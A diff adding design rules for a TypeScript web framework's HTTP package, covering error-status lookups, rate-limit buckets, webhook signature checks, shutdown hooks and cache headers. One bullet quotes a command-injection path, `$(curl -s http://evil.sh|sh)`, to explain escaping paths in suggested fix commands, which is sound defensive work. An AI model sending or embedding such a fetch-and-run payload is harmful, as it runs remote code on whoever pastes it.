+  them is `declaredStatusFor(code)` — `number | undefined`, exported to this package only —
+  because the two questions are genuinely different: `statusFor` always answers a number, while
+  "did ANYBODY classify this code" is what decides whether a 5xx may carry the throwable's own
+  words back to the caller (`isUnclassifiedFailure`). Imports go one way, `error-facts.ts` →
+  `error-map.ts`; a status read from the facts file would be the second table this package
+  spent a release deleting.
+
+- Statuses live in `error-map.ts` only. No other file writes a status number. The framework's
+  table (`ERROR_STATUS`) is closed; an app declares its own codes' statuses with
+  `registerErrorStatus()`, which refuses a code the framework already holds. Without that half,
+  every app code was 500 and `pipeline.ts` paged the on-call for a wrong password. There is
+  deliberately **no projection of the app's half**: `appErrorStatus()` was exported for "`x errors
+  list` and the manifest" and neither ever called it (deleted 2026-08). It could not have worked —
+  `APP_ERROR_STATUS` is process-global runtime state filled by the app's own imports, while both
+  named surfaces are build artefacts derived from source, so in a CLI process it answers `{}`.
+  Wiring one means deriving it from source, not re-exporting the map.
+
+- **A handler's own `Response.status` is never rewritten.** `error-map.ts` answers the status of a
+  THROW; a status a handler chose — `html(page, { status: 404 })`, which is what a page route's
+  `withStatus(404, data)` in `@ultimat3/render` becomes — passes through every stage as written,
+  body included, in dev and in production. `pipeline-handler-status.test.ts` pins it, because the
+  render seam is only true while this is: ai-maxxing's `/fleet/nope` answered 200 for as long as
+  the only way to a 404 was the error page, outside the app's shell.
+
+- **The context carries the inbound headers, never the `Request`.** `ctx.requestHeaders` is set
+  once at construction; `useRequestHeader` / `useRequestCookie` are what app code reads, and
+  `UltimateRequest.cookie()` is what `hooks.authenticate` reads. A `Request` on the context is a
+  second body reader past the size cap, the content-type parse and the cache.
+
+- **`hooks.authenticate` has one declaration site: `configureAuthenticator()`.** A single value,
+  not a list — two answers to "who is this?" is two identities per request. `@ultimat3/auth` is
+  the same tier and can never import this package, so the app is what wires them together.
+
+- **`hooks.devNotices` is dev-only, and the overlay path is the only place it is called.**
+  `OverlayNotice` is declared structurally in `overlay.ts` because the packages that produce one
+  — `@ultimat3/entity`'s N+1 codes, reported by `x dev` — are this tier or above and can never be
+  imported here, exactly as `AuthzDecision` is. The call sits INSIDE the
+  `config.dev && wantsOverlay` branch: the overlay is a notice's only surface, so a production
+  process, or an agent that asked for problem+json, must not pay a diagnostic's per-request cost
+  for findings nothing renders. No notices means no card, byte for byte.
+
+- **`matchRoute` never throws — a pathname is whatever the client typed.** `decodeURIComponent`
+  is called only through `router.ts`'s guarded `decodeSegment`, and a segment that will not decode
+  answers `{ reason: 'path-invalid', segment }` → `X_PATH_INVALID` → 400. A bare `URIError` here
+  reached `factsOf` as `X_INTERNAL`, so a `%ZZ` answered 500 and paged the on-call for a typo.
+  Only the branch that would have decoded fails: static segments are compared raw, so a path that
+  reaches no param or wildcard is still a 404 and precedence is unchanged.
+
+- **`handle()` resolves to a Response or the server has no answer at all.** The request phases are
+  guarded by `execute`'s own `try`; the two that run after them are guarded in `finalize.ts`, and
+  neither guard is optional. A finalize stage that refuses the response it was handed degrades to
+  `X_PIPELINE_FINALIZE_FAILED` (500), and the chain runs a **second** pass over that problem
+  document — whose headers are writable — so the request id, CORS and the security headers still
+  reach the client. Two passes, never a loop. A throw inside the recover stage (an app's `onError`,
+  a `devNotices` producer) is answered with the problem document for the error the request actually
+  hit: the stage that renders a throw has nothing left to render its own. Every degraded answer goes
+  *through* the recover stage, never around it — reporting, logging and the overlay each keep one
+  call site.
+
+- **Both guards in that tail are TOTAL against a throwable that fights being read** (`As of
+  2026-08`). `recoverWith`'s catch built its log line with `String(failure)`, which is itself a
+  `TypeError` on a null-prototype object — thrown out of the one guard documented "never throws, by
+  construction", from the frame with nothing above it. It is a log FIELD now, the same rule the
+  `error-map` stage already follows, and `logger.emit` degrades a hostile field per key. The second
+  half is `factsOf`: it read `record['code']` directly, and that read is a getter call or a
+  `Proxy`'s `get` trap on a value the framework did not build — so a handler throwing one took the
+  recover stage AND the `problem()` the guard degrades to, and `handle()` rejected. Every field
+  comes off the throwable through core's `stringField`. Never spell either read inline again:
+  `String(x)`, `${x}` and a bare property read on a caught value are all the same defect, and
+  `error-render.ts` names seven prior instances.
+
+- **A table keyed by a `code` is read with `Object.hasOwn`, never `[code] !== undefined`** (`As of
+  2026-08`). `code` is a string off a throwable this package did not build, so `ERROR_STATUS` and
+  `HTTP_ERROR_TITLES` — object literals, and therefore holders of every name on
+  `Object.prototype` — answered `'toString'`, `'constructor'`, `'valueOf'` and `'hasOwnProperty'`
+  with a FUNCTION. `statusFor` handed that to `new Response(body, { status })`, a `RangeError`
+  raised inside `recoverWith`'s fallback, and `handle()` rejected: the same defect class as the
+  reads above, arriving through a lookup instead of a property. `registerErrorStatus` had the third
+  copy, refusing an app code named `toString` with a cause reading `the framework already maps it
+  to function toString() { [native code] }`. `scripts/error-map.ts` reads this table correctly and
+  always has. `APP_ERROR_STATUS` is a `Map`, which is why it never had the bug — prefer one for
+  anything keyed by a value a caller chose.
+
+- **`recoverWith`'s fallback is INSIDE its `try`.** `return problem(ctx.error, …)` sat beside the
+  guard, so the file whose one promise is "never throws, by construction" rested on every reader
+  below that line being total. The degraded answer is a literal `problem+json` document naming
+  `X_INTERNAL`, built with no call that could fail in turn, and the renderer's own failure goes to
+  the log as `pipeline.problem_failed` — a last resort sharing a code path with what just broke is
+  not one.
+
+- **One request spends a LIST of rate-limit keys, and the tenant's is the second** (`As of
+  2026-08-24`). `rateLimitKey` picked ONE subject — actor > org > ip, exclusive — and `actorView`
+  answers `null` for anonymous, so `orgId` was consulted only for a caller with an org and no id:
+  **no authenticated request ever touched an org bucket**. A tenant with 8,000 seats whose
+  integration entered a retry loop therefore took 8,000 × the per-actor burst against one shared
+  pool, every bucket inside its own limit, and no number an operator could set would have refused
+  it — while `@ultimat3/jobs` has had `perTenant` since it shipped. `rateLimitSpends` answers the
+  caller's key **and** `tenant|org:<id>` when the app declared `rateLimit.tenantBucket`; the stage
+  spends them in order and stops at the first refusal, so a caller its own bucket already refused
+  costs its tenant nothing. The tenant key is deliberately NOT scoped to the route — a per-route
+  tenant bucket is the same number multiplied by the route table, which is not a cap. `null` is
+  the default because one tenant is a person and the next is five thousand seats (axiom 8), and a
+  name nothing declares is `X_RATE_LIMIT_TENANT_BUCKET_UNKNOWN` at `defineHttpConfig`, never a
+  silent fall-through to `default`. The headers report the bucket **closest to refusing**: telling
+  a client `remaining: 99` off its own bucket while its tenant's holds 2 is a number that plans a
+  caller into a 429.
+
+- **The memory rate-limit store is bounded, and the eviction order is part of the guarantee.**
+  The key falls back to the connection address (`rateLimitSpends`), so a scan rotating through an
+  IPv6 /64 mints one entry per request — an unbounded map hands the flood the process. Every
+  entry carries `forgetAtMs`, the instant a refilled bucket becomes indistinguishable from a
+  missing one, and the sweep drops those for free. `DEFAULT_MAX_RATE_LIMIT_KEYS` is the backstop,
+  and it evicts the entries **closest to full** first: throwing away a spent bucket is a free
+  reset for whoever spent it, so the most-throttled key is the last one to go. Never swap that
+  comparator for insertion order or an LRU — recency is not the same as worthlessness here.
+
+- **The limiter takes a `Clock`; `Date.now()` is not read here** (`As of 2026-08-19`). `rate-limit.ts`
+  read it inline while BOTH production call sites (`server.ts`, `pipeline.ts`) built their limiter
+  with no override, so the bucket maths that decides whether a caller is throttled could not be
+  frozen by any test — while `@ultimat3/auth`'s credential limiter has taken an injected `Clock`
+  since it shipped. `createRateLimiter({ clock })` defaults to `systemClock`, the same shape as
+  `createRequestContext`'s `init.clock`. Deliberately NOT a `clock` on `PipelineDeps`:
+  `deps.limiter` is already the one seam for handing the pipeline a limiter you built, and a second
+  entry point for one number is axiom 1.
+
+- **Where the limiter's counters live is DECLARED by the app, never inferred, and refused at
+  boot — and there is no default.** `DEFAULT_RATE_LIMIT` carries no `scope`, so
+  `resolveRateLimitConfig` refuses `X_RATE_LIMIT_SCOPE_UNSET` at `defineHttpConfig` when a limiter
+  that is ENABLED has not been told. `'process'` used to be the default, which made "nobody asked"
+  and "the app said one replica" the same value while `docker/helm/values.yaml` runs three — so
+  `assertRateLimitScope` below, which only fires on a `'shared'` declaration, could never see the
+  silent case. A disabled limiter owes no declaration: nothing is enforced, so nothing can be
+  wrong. The rest of the check is unchanged: `RateLimitStore.scope` says what a driver provides; `config.rateLimit.scope` says what
+  the deployment requires; `assertRateLimitScope` compares them once, inside `createPipeline` —
+  the one construction path `createServer`, the tests and any embedder all share. `'shared'` over
+  a per-process store is `X_RATE_LIMIT_NOT_SHARED` before the socket opens, because the failure it
+  replaces is silent: the limiter's counters are **per process**, and `docker/helm/values.yaml`
+  runs `roles.web.replicas: 3` before its HPA has said anything, so every configured bucket was
+  being enforced three times over with a green `x verify`. Nothing here reads the
+  environment to guess a replica count — an app that scales is the only thing that knows. The
+  supported way to install one is `createServer({ rateLimitStore })`, which builds the limiter
+  through `createRateLimiter` and hands it to the `PipelineDeps.limiter` seam that already
+  existed; never add a second limiter entry point beside it.
+
+- **The shared store is `postgresRateLimitStore({ executor })`, and it is what makes
+  `scope: 'shared'` satisfiable** (`As of 2026-08`). Before it, `assertRateLimitScope` refused
+  every store the framework shipped, so the declaration required by a chart with `replicas: 3` had no
+  answer. `PgExecutor` is declared STRUCTURALLY here, exactly as `@ultimat3/action`'s idempotency
+  store declares it: this package has no `@ultimat3/db` dependency, and taking one to type a single
+  method would put the database package in http's install graph. The refill expression is repeated
+  four times inside `on conflict do update` **on purpose** — only a direct `x_rate_limit.<column>`
+  reference reads the row as it is after the lock, so a CTE computing it once would compute from
+  the statement's own snapshot and lose a concurrent spend. `spent` is a stored column because the
+  token count alone cannot tell a take that landed at 0.5 from a refusal with 0.5 left, and the
+  invented answer would be "allowed". `purgeExpired(nowMs)` takes the CALLER's clock and never
+  `now()`: `last_ms` is written from the caller's, so measuring against the server's reads the
+  offset between the two as refill and deletes buckets a throttled caller is still sitting in.
+
+- **A bucket a route names is a bucket something must register.** `meta.rateLimit` selects by
+  name and `meta.rateLimitBucket` carries the numbers; `withRouteBuckets` (`rate-limit-buckets.ts`)
+  merges them into `config.rateLimit.buckets` at construction, in `createServer` and again in
+  `createPipeline` — idempotently, since the store-backed limiter is built from the merged config
+  and `bucketFor` must see the same table the pipeline does. It has to happen there: routes do not
+  exist when `defineHttpConfig` builds the table, so a name declared and never registered fell
+  through to `default` — an action declaring `limit: 5` ran on 120 burst while its OpenAPI
+  operation published 5. **Precedence is refusal, not a winner.** An identical restatement passes;
+  any disagreement, with the config or with another route, is `X_RATE_LIMIT_BUCKET_CONFLICT` before
+  the socket opens — the same shape as `assertRateLimitScope` and as `@ultimat3/auth`'s
+  `AuthLimiter` policy check, and for the same reason: the declaration that lost would go on being
+  read as enforced. Never make one side the default winner.
+
+- **Registering into the config is only half of it — the installed LIMITER must hold the bucket
+  too.** `createRateLimiter` closes over its config, so a limiter handed to `PipelineDeps.limiter`
+  resolves names against the table it was built with; one built before the routes existed misses
+  the route's name, falls through `bucketFor` to `default`, and was measured at 120 burst and 21
+  of 21 requests allowed for a route declaring 5. `RateLimiter.buckets` publishes that table —
+  declared, never inferred, exactly as `RateLimitStore.scope` is — and `assertRouteBuckets` runs
+  beside `assertRateLimitScope` in `createPipeline`. **Refused, never rebound**: a `RateLimiter`
+  is opaque, so rebinding means discarding the caller's limiter and the store it carries, and a
+  caller who built their own may have meant their own numbers. A limiter that declares no table
+  is refused too — what cannot be shown to hold is not assumed to hold.
+
+- **`verifyWebhookSignature` is a FUNCTION, never a pipeline stage** (`As of 2026-08-24`). The
+  secret is per SENDER, and only the route knows which sender it is serving; a stage would need one
+  secret for the whole app or a table this package has no business holding. It reads the body
+  through core's `readWithinLimit` — the same counting reader `UltimateRequest.#read` uses — so it
+  composes with the cap rather than defeating it, and it answers the raw text so the caller parses
+  the bytes that were signed rather than a re-serialisation of them.
+
+  The order inside it is load-bearing: the mac is checked BEFORE the freshness window, so
+  `X_WEBHOOK_SIGNATURE_STALE` means *authentic and old* and never *unreadable and old* — an
+  operator reading it goes to a clock or a replay, which is the only reason the second code exists.
+  The window is `Math.abs`, both directions: a sender whose clock runs ahead is the same replay
+  window pointed the other way, and accepting the future half doubles it. The timestamp is parsed
+  digits-only because `Number('nope')` is `NaN` and `NaN > toleranceMs` is FALSE — the one guard
+  whose failure mode is "the check does not run". `:` is refused in the id and the topic because
+  one mac over `v1:t:evt:01HZ:orders.paid:<body>` would otherwise authenticate two different
+  id/topic splits. The comparison is `timingSafeEqual` and may never become `===`; `bun run
+  secret-compare` is the mechanical half and `mac`/`signature` are names it reads.
+
+  **The FORMAT is `@ultimat3/core`'s and is not re-declared here** (`As of 2026-08-24`).
+  `packages/core/src/webhook-signature.ts` owns the canonical string, the mac and the parse;
+  this file owns the POLICY — what counts as fresh, how large a body may be, and which refusal a
+  receiver answers with. It shipped for one release as two implementations, here and in
+  `@ultimat3/jobs`, held together by a hex literal asserted in two test files: this package is
+  tier 2 and may not reach tier 3, that one's boundary forbids `http`, so the one copy lives at
+  the tier both can reach — the argument `timing-safe-equal.ts` makes for itself. The two literal
+  vectors stay until `scripts/webhook-round-trip.test.ts` replaces them. **Never re-declare the
+  canonical string here.**
+
+- No `any`. Validation goes through Standard Schema (`validate.ts`), not a vendor API.
+
+- Health endpoints answer outside the pipeline, on purpose.
+
+- **Lifecycle belongs to core.** `server.ts` uses `beginWork()`, `markReady()`,
+  `drain()` and `healthzPayload()`/`readyzPayload()`. Never keep a private `state` or
+  in-flight counter — core waits on work it does not know about, so a private counter
+  hangs every deploy at the `inflight` phase.
+
+- **`stop()` hands its two hooks back ABOVE its early return** (`As of 2026-09`). The `close` hook
+  sets `server = undefined`, so on the SIGTERM path `if (server === undefined) return` skipped the
+  `unregister?.()` pair in the `finally` — for exactly the path production takes. Every later
+  `stop()` (a test teardown, `x dev`'s role rollback) left both registrations pointing at a socket
+  that was already gone, and `shutdownHookCount()` — the probe `packages/core/CLAUDE.md` names for
+  this leak — climbed by two per server per lifecycle. `packages/http/e2e/server.e2e.test.ts` reads
+  that probe now; the shape is `@ultimat3/jobs`' worker teardown, where the release is the
+  closure's business and never the drain's.
+
+- **A pathname reaching a `fix:` goes through `renderFixShellArg`** (`As of 2026-09`).
+  `routeNotFound`'s fix is `x g route <path>`, a command, and the path is whatever an anonymous
+  caller typed: `GET /$(curl -s http://evil.sh|sh)` rendered that substitution verbatim into the
+  line the framework tells its reader to paste. The value still travels in the `cause`, which is
+  read rather than run. `renderFixLiteral` does not cover this — its double quotes leave `$(…)`
+  live in every POSIX shell.
+  **A `code` is gated instead of screened** (`As of 2026-09-06`): `factsOf`'s fallback `fix:` is
+  `x errors explain <code> --json`, and `code` is a string field off a throwable this package did
+  not build — a worker message, a WebSocket frame, an app's own object — so it goes through core's
+  `FRAMEWORK_CODE`, never `startsWith('X_')`. A value that is not a code answers nothing anyway,
+  so the honest command is `x errors list --json`. Same gate, same reason, as `@ultimat3/mcp`'s
+  `server.ts`; the value still travels in `facts.code`.
+  **And a SUPPLIED `fix:` is taken only from a BRANDED framework error** (`As of 2026-09-06`). The
+  gate above screens the code this package renders INTO a command; this one screens a whole command
+  a throwable handed over. `factsOf` normalises a worker message, a WebSocket frame and any app
+  object, so a foreign `fix` is remote text landing in the line an operator is told to paste, and a
+  framework code beside it makes the line read as the framework's own — `isUltimateError`, and
+  nothing else, is what says the value went through `renderFixShellArg` and this tree's gate. An
+  error that crossed a wire and lost its brand falls to the generated line, which is honest. The
+  `cause` still travels: a cause is read, never run.
+
+- **Borrowed error codes are never titled or registered here.** `X_FORBIDDEN` is policy's,
+  `X_UNAUTHENTICATED` is auth's; both sit in `HTTP_BORROWED_ERROR_CODES`, which carries codes
+  only. `HTTP_ERROR_TITLES` holds owned codes, and `registerErrorCodes` takes it whole and
+  unguarded — declaring a borrowed one throws `X_ERROR_CODE_DUPLICATE` at import, which is the
+  point. `factsOf` therefore reads a borrowed code's title off the error itself, never the map.
+
+- **A `cache-control` age is delta-seconds or it is DROPPED, never emitted** (`As of 2026-08-26`).
+  `finiteDeltaSeconds` in `response.ts` — `Number.isSafeInteger && >= 0`, per field. `max-age=NaN`
+  is not a shorter age, it is an unparseable directive a conforming cache IGNORES, so the response
+  fell back to heuristic caching rather than to the declared age. TOTAL, never a throw: this is the
+  response path, and a bad cache hint must not become a 500. Every fallback is the SHORTER
+  direction — `max-age` to 0, `s-maxage` and `stale-while-revalidate` omitted — so nothing here can
+  lengthen an age the caller did not ask for. `http.cache_hint_not_delta_seconds` names the field.
+  **The boot-time half is `route-cache.ts`, `As of 2026-08-26`** — the layered form: refuse where
+  the value is WRITTEN, be total where it is USED. `createRouter` screens `Route.cache`'s three
+  delta-seconds fields per route and throws `X_CONFIG_INVALID` naming the route and the key, so
+  `cache: { maxAgeSeconds: Number(process.env.CACHE_AGE) }` fails at boot instead of registering
+  cleanly and surfacing as one warn line per request, forever. The two screens must accept exactly
+  the same set: this one decides what may be DECLARED, `finiteDeltaSeconds` what may be WRITTEN,
+  and a value one accepts and the other drops is a silent hole between them. **Zero stays legal at
+  both ends** — `max-age=0` is "revalidate every time" and `PRIVATE_CACHE`, `defaultCache`'s
+  anonymous hint and the CLI's authorized-object hint all declare it. `ctx.cache` is NOT screened
+  and must not be: it is app-set per request at runtime, which is the total side by definition.
+
+- **`ServerOptions.drain` is `app.config.ts`'s `drain` section, `As of 2026-09-23`.** Its
+  `readinessGraceMs` goes to core's `configureLifecycle` exactly as `drainTimeoutMs` does — only
+  when declared, so an app's own `configureLifecycle({ readinessGraceMs })` is not reverted by boot.
+  Core waits it out between the `/readyz` flip and this package's `accept` hook
+  (`server?.stop(false)`), so endpoints stop routing here before the socket closes. It is the one
+  reader `config-readers` sees for `drain.readinessGraceMs`; a boot that never passes it runs on
+  core's environment default (5000 ms, 0 in development/test).
+
+- **A 5xx cause is withheld unless its code opts in, `As of 2026-09-23`** (`hasPublicCause` in
+  `problem-meta.ts`). The old rule blanked only an UNDECLARED 5xx, and `X_DB_STATEMENT_FAILED`'s
+  status row made it declared — so production 500 bodies carried the Postgres message and the SQL.
+  The framework's four opt-ins are refusals whose cause is the instruction; an app opts its own in
+  with `registerProblemMeta({ CODE: { publicCause: true } })`. `dev: true` shows everything.
+
+- **The security headers are built once per `(SecurityConfig, https)`** (`responseSecurityHeaders`,
+  a `WeakMap`). Measured: 30.3 µs a call rebuilding the CSP and re-hashing `OVERLAY_STYLE`, 0.03 µs
+  memoised. A config is never mutated after `defineHttpConfig`; a test that needs other headers
+  builds another config object.
+
+- Tests must not touch the network — the preload seals `fetch`. Socket tests live in
+  `e2e/` and run with `bun test packages/http/e2e`, sealed: `start()` calls core's
+  `markListening()`, so the seal treats our own port as self, not egress. Never unseal.
